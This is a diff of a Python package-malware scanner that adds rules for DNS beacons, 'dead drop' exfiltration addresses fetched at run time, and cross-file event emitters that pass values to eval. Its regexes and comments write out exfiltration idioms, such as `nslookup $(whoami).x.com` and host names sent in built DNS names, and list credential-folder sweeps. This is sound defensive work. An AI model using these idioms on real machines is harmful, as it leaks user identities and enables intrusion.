@@ -6234,7 +6234,14 @@ _HOST_INFO_RE = re.compile(
     r"""|\b(?:getoutput|check_output|getstatusoutput|execSync|popen)\s*\(\s*\[?\s*["'](?:whoami|hostname|id|uname"""
     r"""|ifconfig|ipconfig|systeminfo)\b"""
     r"|(?:\$\(|`)\s*(?:whoami|hostname|id|uname|ifconfig|ip\s+a|pwd|ls|cat\s+/etc/passwd|ps)\b"
-    r"|\bos\.(?:hostname|userInfo)\s*[,)]")
+    r"|\bos\.(?:hostname|userInfo)\s*[,)]"
+    # (0.1.8) read through the module itself or a name taken from it:
+    # require('os').hostname(), const { hostname } = require('os'),
+    # import { userInfo } from 'node:os', from socket import gethostname
+    r"""|\brequire\(\s*["'](?:node:)?os["']\s*\)\s*\.\s*(?:hostname|userInfo)\b"""
+    r"""|\b(?:const|let|var|import)\s*\{[^{}\n]{0,200}\b(?:hostname|userInfo)\b[^{}\n]{0,200}\}\s*"""
+    r"""(?:=\s*require\(\s*|from\s*)["'](?:node:)?os["']"""
+    r"|\bfrom\s+(?:socket|getpass)\s+import\s+[^\n]{0,200}\b(?:gethostname|getfqdn|getuser)\b")
 
 
 def sends_host_info(text):
@@ -6301,14 +6308,66 @@ _CRED_SWEEP_SPAN = 400           # characters the credential folders are named w
 _CRED_SWEEP_MIN = 3              # distinct credential folders that make a sweep
 _CRED_SWEEP_MAX = 200            # folder names examined per text
 _B64_URL_LITERAL_RE = re.compile(r"""["'`]aHR0c[A-Za-z0-9+/]{2,}={0,2}["'`]""")
-# a DNS lookup of a name built in an f-string or a template literal (the
-# name, at most 300 characters, is read on its own; the first
-# _DNS_LOOKUP_MAX lookups of a text are)
-_DNS_LOOKUP_RE = re.compile(
+# The DNS beacon: a lookup of a name the code builds from values and a
+# literal domain. The name is the lookup's first argument (at most
+# _DNS_ARG_SPAN characters; the first _DNS_LOOKUP_MAX lookups of a text are
+# read): an f-string or a template literal with a field (`f"{h}.x.com"`), a
+# sum whose last term is the domain's literal (`h + '.x.com'`), a %-format
+# or a str.format() of one (`'%s.x.com' % h`), or a name assigned one of
+# those earlier on (`q = h + '.x.com'` … `lookup(q)`: the last assignment
+# of the name within _DNS_ASSIGN_SPAN characters before the lookup). A shell
+# command may look the name up too (nslookup, dig, host, ping,
+# Resolve-DnsName, or curl or wget of a URL) when its host holds the
+# identity itself — `$(whoami)`, `` `hostname` ``, $USER, %USERNAME%,
+# $env:COMPUTERNAME … — so no other read of it is needed there. The domain
+# is a literal that ends in a top-level name, not a reserved one: a machine
+# looking itself up on its own network (`gethostname() + '.local'`) sends
+# nothing out.
+_DNS_CALL_RE = re.compile(
     r"""(?:\b(?:getaddrinfo|gethostbyname(?:_ex)?)|\bdns\.(?:promises\.)?(?:resolve\w*|lookup)"""
-    r"""|\bresolver\.(?:resolve|query))\s*\(\s*(?:f"([^"\n]{0,300})"|f'([^'\n]{0,300})'|`([^`\n]{0,300})`)""")
-_DNS_BUILT_NAME_RE = re.compile(r"\{[^}\n]+\}[^\n]*\.[A-Za-z]{2,}\Z")
-_DNS_LOOKUP_MAX = 50
+    r"""|\bresolver\.(?:resolve|query))\s*\(""")
+_DNS_TEMPLATE_RE = re.compile(r"""\A(?:f"([^"\n]{0,300})"|f'([^'\n]{0,300})'|`([^`\n]{0,300})`)""")
+_DNS_BUILT_NAME_RE = re.compile(r"\{[^}\n]+\}[^\n]*\.([A-Za-z]{2,})\Z")
+_DNS_SUM_RE = re.compile(r"""\+\s*(?:"[^"\n]*\.([A-Za-z]{2,})"|'[^'\n]*\.([A-Za-z]{2,})'|`[^`$\n]*\.([A-Za-z]{2,})`)\s*\Z""")
+_DNS_FORMAT_RE = re.compile(
+    r"""\A(?:"[^"\n]*(?:%(?:\([^)\n]*\))?[-#0 +]?\d*[sdirx]|\{[^}\n]*\})[^"\n]*\.([A-Za-z]{2,})"|"""
+    r"""'[^'\n]*(?:%(?:\([^)\n]*\))?[-#0 +]?\d*[sdirx]|\{[^}\n]*\})[^'\n]*\.([A-Za-z]{2,})')"""
+    r"""\s*(?:%|\.\s*format\s*\()""")
+# string literals taken out of a sum to see what else it adds (a template
+# with a field is a value)
+_DNS_LITERAL_RE = re.compile(r""""[^"\n]*"|'[^'\n]*'|`[^`$\n]*`""")
+_DNS_VALUE_RE = re.compile(r"[A-Za-z_$(]")
+_DNS_NAME_RE = re.compile(r"\A[A-Za-z_$][\w$]*\Z")
+# the name's assignment: the pattern built around it (the name escaped between)
+_DNS_ASSIGN_HEAD = r"(?<![^\n;{])[ \t]*(?:(?:const|let|var)[ \t]+)?"
+_DNS_ASSIGN_TAIL = r"[ \t]*=(?![=>])[ \t]*([^\n;]*)"
+_DNS_LOCAL_TLDS = frozenset(("local", "localhost", "localdomain", "internal", "intranet", "lan", "home", "corp",
+                             "private", "test", "example", "invalid", "arpa"))
+# the identity written into a shell command, the commands that look a name
+# up (earlier in the same command: after the last line break, |, ; or &), and
+# the host that holds it (the identity marked \x00 in the token around it)
+_DNS_SHELL_ID_RE = re.compile(
+    r"\$\(\s*(?:whoami|hostname|id\s+-un|uname\s+-n)\s*\)|`\s*(?:whoami|hostname|id\s+-un|uname\s+-n)\s*`"
+    r"|\$\{?(?:USER|USERNAME|HOSTNAME|LOGNAME)\b\}?|%(?:USERNAME|COMPUTERNAME|USERDOMAIN)%"
+    r"|\$env:(?:USERNAME|COMPUTERNAME|USERDOMAIN)\b", re.I)
+_DNS_SHELL_CMD_RE = re.compile(r"(?<![\w.$-])(?:nslookup|dig|host|ping6?|curl|wget|Resolve-DnsName)\s")
+# a command that looks a name up, written in code: a literal that starts it
+# and a sum that ends it (`'nslookup ' + h + '.x.com'`), or a template, an
+# f-string or a format string with a field in the name (`f"ping {h}.x.com"`)
+_DNS_CMD_SUM_RE = re.compile(
+    r"""(["'`])(?:nslookup|dig|host|ping6?|curl|wget|Resolve-DnsName)\s[^"'`\n]{0,100}\1\s*\+([^\n;]{1,300})""")
+_DNS_CMD_TEMPLATE_RE = re.compile(
+    r"""["'`](?:nslookup|dig|host|ping6?|curl|wget|Resolve-DnsName)\s[^"'`\n]{0,200}?\{[^}\n]+\}"""
+    r"""[^\s"'`/:\n]*\.([A-Za-z]{2,})(?![\w.-])""")
+_DNS_SHELL_CUT_RE = re.compile(r"[\n|;&]")
+_DNS_SHELL_LEFT_RE = re.compile(r"""[^\s"'`(]*\Z""")
+_DNS_SHELL_RIGHT_RE = re.compile(r"""[^\s"'`)]*""")
+_DNS_SHELL_HOST_RE = re.compile(
+    r"""\A(?:https?://)?[^\s/:"'`|;&<>()]*\x00[^\s/:"'`|;&<>()]*\.([A-Za-z]{2,})(?![\w.-])""")
+_DNS_LOOKUP_MAX = 50             # lookups, and identities in shell commands, read per text
+_DNS_ARG_SPAN = 400              # characters of a lookup's arguments read
+_DNS_ASSIGN_SPAN = 5000          # characters before a lookup searched for its name's assignment
+_DNS_SHELL_SPAN = 300            # characters of a shell command read each side of the identity
 _PUBLIC_IP_LOOKUP_RE = re.compile(
     r"\bapi(?:64)?\.ipify\.org\b|\bip-api\.com\b|\bipinfo\.io\b|\bifconfig\.me\b|\bicanhazip\.com\b"
     r"|\bcheckip\.amazonaws\.com\b|\bipapi\.co\b|\bident\.me\b|\bapi\.myip\.com\b|\bwtfismyip\.com\b")
@@ -6440,12 +6499,16 @@ def _exfil_signs(text, host):
     if sweep is not None and network():
         signs.append((sweep[0], "collects files from several credential folders and sends data over the network "
                                 f"({', '.join('.' + n for n in sweep[1][:4])})"))
+    if host and _B64_URL_LITERAL_RE.search(text) and network():
+        signs.append((host.start(), "sends the machine's user or host name to an address it hides in base64"))
+    at = dns_beacon_at(text, host is not None)
+    if at >= 0:
+        signs.append((at, "sends the machine's user or host name in a DNS lookup of a name it builds"))
     if host:
-        if _B64_URL_LITERAL_RE.search(text) and network():
-            signs.append((host.start(), "sends the machine's user or host name to an address it hides in base64"))
-        at = dns_beacon_at(text)
-        if at >= 0:
-            signs.append((at, "sends the machine's user or host name in a DNS lookup of a name it builds"))
+        drop = dead_drop_at(text)
+        if drop is not None:
+            signs.append((drop[0], f"sends the machine's user or host name to an address it fetches at run time "
+                                   f"(from {drop[1]})"))
     elif any(nd in text for nd in _PUBLIC_IP_LOOKUP_NEEDLES):
         lookup = _PUBLIC_IP_LOOKUP_RE.search(text)
         if lookup:
@@ -6456,16 +6519,123 @@ def _exfil_signs(text, host):
     return signs
 
 
-def dns_beacon_at(text):
-    """The offset of a DNS lookup of a name `text` builds from values
-    (`getaddrinfo(f"{h}.{u}.x.com")`, `dns.lookup(`${h}.x.com`)`), else -1."""
-    for k, m in enumerate(_DNS_LOOKUP_RE.finditer(text)):
+def _call_first_arg(args):
+    """The first argument of a call: `args` (what follows its '(', as
+    _call_args gives it) up to a comma outside brackets and string literals,
+    stripped."""
+    depth, i, n = 0, 0, len(args)
+    while i < n:
+        ch = args[i]
+        if ch in "\"'`":
+            j = args.find(ch, i + 1)
+            if j < 0:
+                break
+            i = j + 1
+            continue
+        if ch in "([{":
+            depth += 1
+        elif ch in ")]}":
+            depth -= 1
+        elif ch == "," and depth == 0:
+            return args[:i].strip()
+        i += 1
+    return args.strip()
+
+
+def _dns_domain_ok(tld):
+    return tld is not None and tld.lower() not in _DNS_LOCAL_TLDS
+
+
+def _dns_built(expr):
+    """Does the expression `expr` build a name from values and a literal
+    domain (see above)?"""
+    m = _DNS_TEMPLATE_RE.match(expr)
+    if m is not None:
+        built = _DNS_BUILT_NAME_RE.search(next(g for g in m.groups() if g is not None))
+        return built is not None and _dns_domain_ok(built.group(1))
+    m = _DNS_SUM_RE.search(expr)
+    if m is not None:
+        # the domain, and a value in the sum (not only literals)
+        return (_dns_domain_ok(m.group(1) or m.group(2) or m.group(3))
+                and _DNS_VALUE_RE.search(_DNS_LITERAL_RE.sub("", expr[:m.start()])) is not None)
+    m = _DNS_FORMAT_RE.match(expr)
+    return m is not None and _dns_domain_ok(m.group(1) or m.group(2))
+
+
+def _dns_shell_at(text):
+    """The offset of a shell command that looks up a name holding the
+    machine's user or host name (see above), else -1."""
+    for k, m in enumerate(_DNS_SHELL_ID_RE.finditer(text)):
         if k >= _DNS_LOOKUP_MAX:
             break
-        name = next(g for g in m.groups() if g is not None)
-        if _DNS_BUILT_NAME_RE.search(name):
-            return m.start()
+        head = text[max(0, m.start() - _DNS_SHELL_SPAN):m.start()]
+        cuts = [c.end() for c in _DNS_SHELL_CUT_RE.finditer(head)]
+        head = head[cuts[-1]:] if cuts else head
+        cmd = _DNS_SHELL_CMD_RE.search(head)
+        if cmd is None:
+            continue
+        tail = text[m.end():m.end() + _DNS_SHELL_SPAN]
+        cut = _DNS_SHELL_CUT_RE.search(tail)
+        tail = _DNS_SHELL_ID_RE.sub("\x00", tail[:cut.start()] if cut is not None else tail)
+        token = (_DNS_SHELL_LEFT_RE.search(head).group() + "\x00"
+                 + _DNS_SHELL_RIGHT_RE.match(tail).group())
+        found = _DNS_SHELL_HOST_RE.match(token)
+        if found is not None and _dns_domain_ok(found.group(1)):
+            return m.start() - len(head) + cmd.start()
     return -1
+
+
+def _dns_call_at(text):
+    """The offset of a lookup call of a built name (see above), else -1."""
+    for k, m in enumerate(_DNS_CALL_RE.finditer(text)):
+        if k >= _DNS_LOOKUP_MAX:
+            break
+        arg = _call_first_arg(_call_args(text[m.end():m.end() + _DNS_ARG_SPAN]))
+        if _dns_built(arg):
+            return m.start()
+        if _DNS_NAME_RE.match(arg):
+            assign = re.compile(_DNS_ASSIGN_HEAD + re.escape(arg) + _DNS_ASSIGN_TAIL)
+            last = None
+            for a in assign.finditer(text, max(0, m.start() - _DNS_ASSIGN_SPAN), m.start()):
+                last = a
+            if last is not None and _dns_built(last.group(1).strip()):
+                return m.start()
+    return -1
+
+
+def _dns_command_at(text):
+    """The offset of a lookup command code writes with a built name (see
+    above), else -1."""
+    found = []
+    for k, m in enumerate(_DNS_CMD_SUM_RE.finditer(text)):
+        if k >= _DNS_LOOKUP_MAX:
+            break
+        rest = _call_first_arg(_call_args(m.group(2)))
+        tail = _DNS_SUM_RE.search("+" + rest)
+        if (tail is not None and _dns_domain_ok(tail.group(1) or tail.group(2) or tail.group(3))
+                and _DNS_VALUE_RE.search(_DNS_LITERAL_RE.sub("", rest[:max(0, tail.start() - 1)])) is not None):
+            found.append(m.start())
+            break
+    for k, m in enumerate(_DNS_CMD_TEMPLATE_RE.finditer(text)):
+        if k >= _DNS_LOOKUP_MAX:
+            break
+        if _dns_domain_ok(m.group(1)):
+            found.append(m.start())
+            break
+    return min(found) if found else -1
+
+
+def dns_beacon_at(text, host=True):
+    """The offset of a DNS lookup of a name `text` builds from values and a
+    literal domain (`getaddrinfo(f"{h}.{u}.x.com")`, `dns.lookup(h + '.x.com')`,
+    `nslookup $(whoami).x.com`: see above), else -1. `host`: does the text
+    read the machine's user or host name? Without, only a shell command's
+    name that holds it counts."""
+    found = [at for at in ((_dns_call_at(text), _dns_command_at(text)) if host else ()) if at >= 0]
+    at = _dns_shell_at(text)
+    if at >= 0:
+        found.append(at)
+    return min(found) if found else -1
 
 
 def miner_at(text):
@@ -6599,27 +6769,27 @@ def _call_args(text):
 _LITERAL_SPANS_MAX = 20000       # literals a text's runners and reads are told apart from
 
 
+_QUOTE_CHAR_RE = re.compile("[\"'`]")
+
+
 def _literal_spans(text):
     """(start, end) of the string literals of `text`, as _string_literals
     reads them (at most _LITERAL_SPANS_MAX of them). One pass."""
-    out, i, n = [], 0, len(text)
-    while i < n and len(out) < _LITERAL_SPANS_MAX:
+    out, n = [], len(text)
+    m = _QUOTE_CHAR_RE.search(text)
+    while m is not None and len(out) < _LITERAL_SPANS_MAX:
+        i = m.start()
         ch = text[i]
-        if ch not in "\"'`":
-            i += 1
-            continue
         if ch != "`" and text.startswith(ch * 3, i):
             j = text.find(ch * 3, i + 3)
             end = n if j < 0 else j + 3
-            out.append((i, end))
-            i = end
-            continue
-        j = i + 1
-        while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
-            j += 2 if text[j] == "\\" else 1
-        end = min(j + 1, n)
+        else:
+            j = i + 1
+            while j < n and text[j] != ch and (ch == "`" or text[j] != "\n"):
+                j += 2 if text[j] == "\\" else 1
+            end = min(j + 1, n)
         out.append((i, end))
-        i = end
+        m = _QUOTE_CHAR_RE.search(text, end)
     return out
 
 
@@ -6713,6 +6883,175 @@ def runs_own_source_at(text):
         if not m.group().startswith(_SELF_SHELL_RUNNERS) and (path_reads(m.end(), hi) or uses(m.end(), hi, code_names)):
             return m.start()
     return -1
+
+
+# ---------------- Dead drops (0.1.8) ----------------
+# The address data goes to may itself be fetched at run time from a
+# hard-coded URL, so no address shows in the code: data-pipeline-check
+# fetched https://….github.io/…/config.json and posted what its credential
+# sweep found, with the host name, to the `webhooks` listed there. The value
+# a fetch of a literal URL gives (the URL written in the call, or in a name
+# assigned it: `req = Request('https://…')` … `urlopen(req)`) — the name the
+# fetch is assigned to, the names a destructuring gives, a `with … as r`, the
+# parameter of a callback among its arguments or of a `.then(…)` chained to
+# it — is followed through the names given it (_DD_PASSES levels: an
+# assignment or a `+=` that uses one, a `for … in` / `for (… of …)` loop over
+# one, the parameter of a callback of a call on one (`res.on('data', c => …)`),
+# a function that returns one). A send whose address uses one is the sign: a
+# Request, urlopen, fetch or http(s).request with data, a body or a POST, PUT
+# or PATCH, a .post / .put / .patch of an HTTP client, a sendBeacon — in a
+# file that reads the machine's user or host name.
+_DD_FETCH_RE = re.compile(
+    r"\b(?:urlopen|requests\s*\.\s*get|httpx\s*\.\s*get|fetch|axios\s*\.\s*get|https?\s*\.\s*get|got)\s*\(")
+_DD_SEND_RE = re.compile(
+    r"\b(?:Request|urlopen|fetch|https?\s*\.\s*request"
+    r"|(?:requests|httpx|axios|got|superagent|needle|session|client)\s*\.\s*(post|put|patch)|(sendBeacon))\s*\(")
+_DD_DATA_RE = re.compile(r"""\b(?:data|body)\s*[=:]|\bjson\s*=|["'](?:POST|PUT|PATCH)["']""", re.I)
+_DD_URL_RE = re.compile(r"""\A[rbfRBF]{0,2}["'`]https?://([^/"'`\s?#]+)""")
+_DD_URL_IN_RE = re.compile(r"""["'`]https?://([^/"'`\s?#]+)""")
+_DD_ASSIGN_RE = re.compile(
+    r"(?:(?<![^\n])|[;{]|=>)[ \t]*(?:(?:const|let|var)[ \t]+)?([A-Za-z_$][\w$]*)[ \t]*\+?=(?![=>])([^;\n]*)")
+_DD_DESTRUCT_RE = re.compile(r"\b(?:const|let|var)\s*\{([^}\n]{1,200})\}\s*=([^;\n]*)")
+_DD_DESTRUCT_NAME_RE = re.compile(r"(?:[A-Za-z_$][\w$]*\s*:\s*)?([A-Za-z_$][\w$]*)\s*(?:=[^,]*)?\Z")
+_DD_FOR_RE = re.compile(
+    r"\bfor\s+([A-Za-z_]\w*)\s+in\s+([^\n:]{1,200})"
+    r"|\bfor\s*\(\s*(?:const|let|var)?\s*([A-Za-z_$][\w$]*)\s+(?:of|in)\s+([^\n)]{1,200})")
+_DD_CALLBACK_RE = re.compile(
+    r"(?<![\w$.])([A-Za-z_$][\w$]*)(?:\s*\.\s*[A-Za-z_$][\w$]*){0,8}\s*\.\s*(?:on|once|forEach|map|then|each)\s*\("
+    r"""\s*(?:["'][^"'\n]{0,40}["']\s*,\s*)?(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)""")
+_DD_ARG_CALLBACK_RE = re.compile(
+    r",\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*\(\s*([A-Za-z_$][\w$]*)|\(\s*([A-Za-z_$][\w$]*)[^)\n]*\)\s*=>"
+    r"|([A-Za-z_$][\w$]*)\s*=>)")
+_DD_THEN_HEAD_RE = re.compile(r"\s*\.\s*then\s*\(")
+_DD_PARAM_RE = re.compile(r"\s*(?:async\s+)?(?:function\b\s*[\w$]*\s*)?\(?\s*([A-Za-z_$][\w$]*)")
+_DD_AS_RE = re.compile(r"\s*as\s+([A-Za-z_]\w*)")
+_DD_RETURN_RE = re.compile(r"\breturn\s+([^\n;]{1,200})")
+_DD_FUNC_RE = re.compile(
+    r"\bdef\s+([A-Za-z_]\w*)\s*\(|\bfunction\s*\*?\s*([A-Za-z_$][\w$]*)\s*\("
+    r"|(?<![\w$.])([A-Za-z_$][\w$]*)\s*=\s*(?:async\s+)?(?:function\b|\([^)\n]{0,200}\)\s*=>|[A-Za-z_$][\w$]*\s*=>)")
+_DD_PASSES = 4                   # levels of names followed from a fetch
+_DD_MAX_CALLS = 100              # fetches, sends, returns and callbacks examined per text
+_DD_ARG_SPAN = 2000              # characters of a call's arguments read
+_DD_MAX_ASSIGNS = 5000           # assignments examined per text
+_DD_THEN_MAX = 4                 # .then(…) links read after a fetch
+
+
+def dead_drop_at(text):
+    """(offset, host) of a send whose address `text` fetched at run time from
+    a literal URL on `host` (see above), else None. The caller checks that
+    the text reads the machine's user or host name."""
+    if "http" not in text or _DD_FETCH_RE.search(text) is None or _DD_SEND_RE.search(text) is None:
+        return None
+    spans = _literal_spans(text)
+    starts = [a for a, _ in spans]
+
+    def in_literal(pos):
+        k = bisect.bisect_right(starts, pos) - 1
+        return k >= 0 and pos < spans[k][1]
+
+    def uses(lo, hi, names):
+        return bool(names) and any(m.group() in names and not in_literal(lo + m.start())
+                                   for m in _IDENT_TOKEN_RE.finditer(text[lo:hi]))
+
+    assigns = []                                    # (name, start, end) of what is assigned
+    url_names = {}                                  # name -> the host of the URL literal assigned to it
+    for k, m in enumerate(_DD_ASSIGN_RE.finditer(text)):
+        if k >= _DD_MAX_ASSIGNS:
+            break
+        if in_literal(m.start(1)):
+            continue
+        assigns.append((m.group(1), m.start(2), m.end(2)))
+        url = _DD_URL_IN_RE.search(m.group(2))
+        if url is not None and m.group(1) not in url_names:
+            url_names[m.group(1)] = url.group(1)
+    for k, m in enumerate(_DD_DESTRUCT_RE.finditer(text)):
+        if k >= _DD_MAX_ASSIGNS:
+            break
+        if in_literal(m.start()):
+            continue
+        for part in m.group(1).split(","):
+            name = _DD_DESTRUCT_NAME_RE.search(part.strip())
+            if name is not None:
+                assigns.append((name.group(1), m.start(2), m.end(2)))
+    followed, origin = set(), None
+    for k, f in enumerate(_DD_FETCH_RE.finditer(text)):
+        if k >= _DD_MAX_CALLS:
+            break
+        if in_literal(f.start()):
+            continue
+        args = _call_args(text[f.end():f.end() + _DD_ARG_SPAN])
+        first = _call_first_arg(args)
+        url = _DD_URL_RE.match(first)
+        host = url.group(1) if url is not None else url_names.get(first)
+        if host is None:
+            continue
+        before = len(followed)
+        followed.update(name for name, lo, hi in assigns if lo <= f.start() < hi)
+        cb = _DD_ARG_CALLBACK_RE.search(args)
+        if cb is not None and not in_literal(f.end() + cb.start()):
+            followed.add(cb.group(1) or cb.group(2) or cb.group(3))
+        pos = f.end() + len(args) + 1               # after the call's closing bracket
+        m = _DD_AS_RE.match(text, pos)
+        if m is not None:
+            followed.add(m.group(1))
+        for _ in range(_DD_THEN_MAX):
+            h = _DD_THEN_HEAD_RE.match(text, pos)
+            if h is None:
+                break
+            then_args = _call_args(text[h.end():h.end() + _DD_ARG_SPAN])
+            param = _DD_PARAM_RE.match(then_args)
+            if param is not None:
+                followed.add(param.group(1))
+            pos = h.end() + len(then_args) + 1
+        if origin is None and len(followed) > before:
+            origin = host
+    if not followed:
+        return None
+    funcs = []                                      # (start, name) of the functions defined
+    for k, m in enumerate(_DD_FUNC_RE.finditer(text)):
+        if k >= _DD_MAX_ASSIGNS:
+            break
+        funcs.append((m.start(), m.group(1) or m.group(2) or m.group(3)))
+    func_starts = [a for a, _ in funcs]
+    loops = [(m.group(1) or m.group(3), m.start(2) if m.group(2) else m.start(4),
+              m.end(2) if m.group(2) else m.end(4))
+             for k, m in zip(range(_DD_MAX_ASSIGNS), _DD_FOR_RE.finditer(text)) if not in_literal(m.start())]
+    for _ in range(_DD_PASSES):
+        grown = False
+        for name, lo, hi in assigns + loops:
+            if name not in followed and uses(lo, hi, followed):
+                followed.add(name)
+                grown = True
+        for k, m in enumerate(_DD_CALLBACK_RE.finditer(text)):
+            if k >= _DD_MAX_CALLS:
+                break
+            if m.group(1) in followed and m.group(2) not in followed and not in_literal(m.start()):
+                followed.add(m.group(2))
+                grown = True
+        for k, m in enumerate(_DD_RETURN_RE.finditer(text)):
+            if k >= _DD_MAX_CALLS:
+                break
+            if in_literal(m.start()) or not uses(m.start(1), m.end(1), followed):
+                continue
+            at = bisect.bisect_right(func_starts, m.start()) - 1
+            if at >= 0 and funcs[at][1] not in followed:
+                followed.add(funcs[at][1])
+                grown = True
+        if not grown:
+            break
+    for k, s in enumerate(_DD_SEND_RE.finditer(text)):
+        if k >= _DD_MAX_CALLS:
+            break
+        if in_literal(s.start()):
+            continue
+        args = _call_args(text[s.end():s.end() + _DD_ARG_SPAN])
+        first = _call_first_arg(args)
+        lead = len(args) - len(args.lstrip())
+        if not uses(s.end() + lead, s.end() + lead + len(first), followed):
+            continue
+        if s.group(1) or s.group(2) or _DD_DATA_RE.search(args):
+            return s.start(), origin
+    return None
 
 
 # ---------------- Persistence targets (0.1.7) ----------------
@@ -7807,6 +8146,7 @@ _STRONG_IMPORT_REASONS = (
     "sends data to a Slack webhook whose key", "reads credential files and sends data to an IP address",
     "collects files from several credential folders", "sends the machine's user or host name to an address it hides",
     "sends the machine's user or host name in a DNS lookup", "sends the machine's public IP address to a data-capture",
+    "sends the machine's user or host name to an address it fetches",
     "runs a cryptocurrency miner")
 # Endpoints that exist to capture what is sent to them (out-of-band testing,
 # request inspection): no library reports to one
@@ -11983,6 +12323,147 @@ def _xf_rewrite(code, direct, lang):
     return code, names
 
 
+# (0.1.8) An event emitter between files: one file emits a value it received
+# on an event (`bus.emit('code', c)`), another listens for that event on the
+# same emitter — the object one module defines and the other imports, or a
+# global such as process — and runs what its listener is given
+# (`bus.on('code', (c) => eval(c))`, `bus.on('code', eval)`). The emitting file
+# is read by the single-file detector with its emits of that event read as a
+# call of a code runner (`_xfe(c)`), which says whether a received value is
+# emitted; the listening file is then read with the listener's parameter
+# seeded (for a handler given by name, a call of it on a seeded name is read
+# after the file). npm packages only (Python's event libraries are not read);
+# the first _XF_EMIT_MAX emits and listeners of a file are. An emit or a
+# listener in a comment is not one (in a file that reads its own source it is,
+# as _import_code reads that file); a file's comments are read only where an
+# emit meets a listener, and its emits and listeners where its member calls
+# are (_xf_calls): a bundle is not lexed or read position by position.
+_XF_EMIT_RE = re.compile(
+    r"(?<![\w$.])(?P<obj>[A-Za-z_$][\w$]*)[ \t]*\.[ \t]*emit[ \t]*\([ \t]*(?P<q>['\"`])(?P<event>[^'\"`\n]{1,100})"
+    r"\2[ \t]*,")
+_XF_LISTEN_RE = re.compile(
+    r"(?<![\w$.])(?P<obj>[A-Za-z_$][\w$]*)[ \t]*\.[ \t]*(?:on|once|addListener|prependListener|prependOnceListener)"
+    r"[ \t]*\([ \t]*(?P<q>['\"`])(?P<event>[^'\"`\n]{1,100})\2[ \t]*,[ \t]*"
+    r"(?:(?:async[ \t]+)?(?:function\b[ \t]*[\w$]*[ \t]*\([ \t]*(?P<fp>[A-Za-z_$][\w$]*)"
+    r"|\([ \t]*(?P<ap>[A-Za-z_$][\w$]*)[^)\n]*\)[ \t]*=>|(?P<bp>[A-Za-z_$][\w$]*)[ \t]*=>)"
+    r"|(?P<handler>[A-Za-z_$][\w$]*(?:[ \t]*\.[ \t]*[A-Za-z_$][\w$]*){0,3})[ \t]*[,)])")
+_XF_EMIT_AT_RE = re.compile(r"\.[ \t]*emit[ \t]*\(")           # the member calls they make (_xf_calls)
+_XF_LISTEN_AT_RE = re.compile(r"\.[ \t]*(?:on|once|addListener|prependListener|prependOnceListener)[ \t]*\(")
+_XF_EMIT_NEEDLE = "emit"         # a file without it emits nothing
+_XF_EMIT_GLOBALS = frozenset(("process",))   # the emitters every file shares by name
+_XF_EMIT_MAX = 50                # emits and listeners read per file
+
+
+def _xf_emitter_of(pkg, mod, name):
+    """What an emitter's name is in `mod`, the same in every file that names
+    it: what an import of it resolves to (or the import itself), a symbol of
+    the module, or a global every file shares (process). None for any other
+    name — `this`, a parameter, a local of a function — which is its file's
+    own: two classes' `this.emit` and `this.on` are two emitters."""
+    imp = mod.imports.get(name)
+    if imp is not None:
+        got = pkg.resolve_import(imp)
+        return got if got is not None else ("import", imp[0], imp[1])
+    got = pkg.resolve_local(mod, name)
+    if got is not None:
+        return got
+    return ("global", name) if name in _XF_EMIT_GLOBALS else None
+
+
+def _xf_calls(rx, at_re, text):
+    """rx.finditer(text), for _XF_EMIT_RE (at_re: _XF_EMIT_AT_RE) and
+    _XF_LISTEN_RE (_XF_LISTEN_AT_RE), read only where at_re finds the member
+    call a match makes: a match is the identifier before that call's '.'
+    (spaces and tabs between) and the call, so it can only start where that
+    identifier does. The same matches, where the full reading tries every
+    position of a bundle."""
+    end = 0
+    for at in at_re.finditer(text):
+        k = at.start()
+        while k > 0 and text[k - 1] in " \t":
+            k -= 1
+        s = k
+        while s > 0 and (text[s - 1].isalnum() or text[s - 1] in "_$"):     # [\w$]
+            s -= 1
+        if s == k or s < end:                           # no identifier; inside the last match
+            continue
+        m = rx.match(text, s)
+        if m is not None:
+            end = m.end()
+            yield m
+
+
+def _xf_emitter_seeds(pkg, tainted, envs, held):
+    """{module key: ({name: label}, [rows], line)}: for each file that listens
+    for an event another file emits a received value on (see above), the
+    names its listeners are given, the calls read after the file for a
+    handler given by name, and the line of its first such listener."""
+    emits, listens = {}, {}
+    for mod in pkg.mods.values():
+        if mod.lang != "js" or _XF_EMIT_NEEDLE not in mod.text:
+            continue
+        for k, m in enumerate(_xf_calls(_XF_EMIT_RE, _XF_EMIT_AT_RE, mod.text)):
+            if k >= _XF_EMIT_MAX:
+                break
+            emitter = _xf_emitter_of(pkg, mod, m.group("obj"))
+            if emitter is not None:
+                emits.setdefault((emitter, m.group("event")), {}).setdefault(mod.key, []).append(m)
+    # a listener only matters for an event something emits: a file without any such event's name is not read
+    events = {event for _emitter, event in emits}
+    for mod in pkg.mods.values():
+        if mod.lang != "js" or not any(event in mod.text for event in events):
+            continue
+        for k, m in enumerate(_xf_calls(_XF_LISTEN_RE, _XF_LISTEN_AT_RE, mod.text)):
+            if k >= _XF_EMIT_MAX:
+                break
+            emitter = _xf_emitter_of(pkg, mod, m.group("obj"))
+            if emitter is not None:
+                listens.setdefault((emitter, m.group("event")), []).append((mod.key, m))
+    comments, codes = {}, {}
+
+    def is_code(key, m):
+        """Is match m of module `key` code, not in a comment? (A file's
+        comments are read once, and only where an emit meets a listener.)"""
+        if key not in comments:
+            text = pkg.mods[key].text
+            comments[key] = [] if reads_own_source(text) else _lex_comment_spans(text, "js")
+        spans = comments[key]
+        k = bisect.bisect_left(spans, (m.end(),)) - 1       # the last comment that starts before m ends
+        return k < 0 or spans[k][1] <= m.start()
+
+    out = {}
+    for chan, by_mod in emits.items():
+        for key, ms in sorted(by_mod.items(), key=lambda one: one[0]):
+            heard = [(lkey, m) for lkey, m in listens.get(chan, ()) if lkey != key]
+            objs = {m.group("obj") for m in ms if is_code(key, m)} if heard else set()
+            heard = [(lkey, m) for lkey, m in heard if is_code(lkey, m)] if objs else []
+            if not heard:
+                continue
+            if key not in codes:
+                codes[key] = _import_code(pkg.mods[key].text, "js")
+            code = codes[key]
+            for obj in sorted(objs):
+                rx = re.compile(r"(?<![\w$.])" + re.escape(obj) + r"[ \t]*\.[ \t]*emit[ \t]*\([ \t]*(['\"`])"
+                                + re.escape(chan[1]) + r"\1[ \t]*,")
+                code = rx.sub(lambda m: "_xfe(".ljust(len(m.group())), code)
+            seeds = _xf_seeds(pkg, pkg.mods[key], tainted, envs, held)[0] if tainted else {}
